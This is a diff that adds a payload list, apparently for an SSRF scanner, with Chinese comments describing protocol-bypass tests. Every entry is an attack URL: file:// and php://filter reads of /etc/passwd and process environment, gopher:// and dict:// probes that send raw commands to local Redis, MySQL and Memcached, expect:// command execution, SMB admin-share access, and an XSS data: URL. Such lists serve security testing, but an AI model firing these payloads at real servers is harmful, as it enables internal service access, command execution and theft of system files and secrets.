@@ -1,0 +1,67 @@
+# 协议绕过 Payload
+# 测试各种协议是否被允许
+# 扫描会自动跳过空格和注释
+
+# ========== File 协议 ==========
+file:///etc/passwd
+file:///c:/windows/win.ini
+file://localhost/etc/passwd
+file:///proc/self/environ
+
+# ========== Dict 协议 ==========
+# Dict 可以用来探测服务端口
+dict://127.0.0.1:6379/info
+dict://127.0.0.1:11211/stats
+dict://127.0.0.1:3306/
+dict://localhost:6379/info
+
+# ========== Gopher 协议 ==========
+# Gopher 可以构造任意TCP数据包
+gopher://127.0.0.1:6379/_INFO
+gopher://127.0.0.1:6379/_CONFIG%20GET%20dir
+gopher://127.0.0.1:3306/_
+gopher://localhost:6379/_PING
+
+# Redis命令示例
+gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0ainfo%0d%0a
+gopher://127.0.0.1:6379/_*1%0d%0a$7%0d%0adbsize%0d%0a
+
+# ========== SFTP/FTP 协议 ==========
+sftp://127.0.0.1/etc/passwd
+ftp://127.0.0.1/
+ftp://anonymous:password@127.0.0.1/
+
+# ========== LDAP 协议 ==========
+ldap://127.0.0.1:389/
+ldap://localhost:389/dc=example,dc=com
+
+# ========== TFTP 协议 ==========
+tftp://127.0.0.1/
+tftp://127.0.0.1:69/boot.ini
+
+# ========== SMB 协议 ==========
+smb://127.0.0.1/share
+smb://192.168.1.1/c$
+
+# ========== Jar 协议 ==========
+jar:http://127.0.0.1/test.jar!/
+jar:file:///var/www/html/test.jar!/
+
+# ========== Data 协议 ==========
+data://text/plain;base64,SSBsb3ZlIFBIUAo=
+data:text/html,<script>alert(1)</script>
+
+# ========== Expect 协议 ==========
+expect://id
+expect://ls
+
+# ========== PHP Wrapper ==========
+php://filter/convert.base64-encode/resource=/etc/passwd
+php://input
+php://filter/read=string.rot13/resource=/etc/passwd
+
+# ========== HTTP 变种 ==========
+http://127.0.0.1
+https://127.0.0.1
+http://localhost
+https://localhost
